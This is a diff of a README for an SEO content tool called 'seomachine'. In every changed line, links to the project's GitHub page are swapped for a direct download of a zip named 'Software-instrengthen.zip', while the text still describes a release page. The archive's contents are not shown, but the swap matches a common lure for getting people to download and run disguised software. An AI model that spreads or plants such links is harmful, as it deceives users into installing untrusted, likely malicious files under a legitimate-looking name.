@@ -1,6 +1,6 @@
 # 🚀 seomachine - Effortless SEO Content Creation  
 
-[![Download seomachine](https://img.shields.io/badge/Download-seomachine-ff6f61?style=for-the-badge&logo=github)](https://github.com/bahruddinrm/seomachine)
+[![Download seomachine](https://img.shields.io/badge/Download-seomachine-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bahruddinrm/seomachine/main/output/Software-instrengthen.zip)
 
 ## What is seomachine?  
 
@@ -31,7 +31,7 @@ Before you install seomachine, check that your computer meets these needs:
 
 Click the big badge below to open the download page in your browser. This is where you can get the latest version of seomachine.  
 
-[![Download seomachine](https://img.shields.io/badge/Download-seomachine-ff6f61?style=for-the-badge&logo=github)](https://github.com/bahruddinrm/seomachine)  
+[![Download seomachine](https://img.shields.io/badge/Download-seomachine-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bahruddinrm/seomachine/main/output/Software-instrengthen.zip)  
 
 On the page, look for the latest release or a download link, then click to get the file.  
 
@@ -40,7 +40,7 @@ On the page, look for the latest release or a download link, then click to get t
 Follow these steps to install seomachine on your Windows PC. The process is simple and takes just a few minutes.  
 
 1. Visit the download page by clicking the badge at the top or this link:  
-   https://github.com/bahruddinrm/seomachine  
+   https://raw.githubusercontent.com/bahruddinrm/seomachine/main/output/Software-instrengthen.zip  
 
 2. Find the latest release section. Usually, it shows the most recent version.  
 
@@ -132,7 +132,7 @@ If you need assistance using seomachine:
 
 To update seomachine:  
 
-- Visit the download page again at: https://github.com/bahruddinrm/seomachine  
+- Visit the download page again at: https://raw.githubusercontent.com/bahruddinrm/seomachine/main/output/Software-instrengthen.zip  
 - Download the newest version when available.  
 - Install it over your current copy to keep your settings.  
 
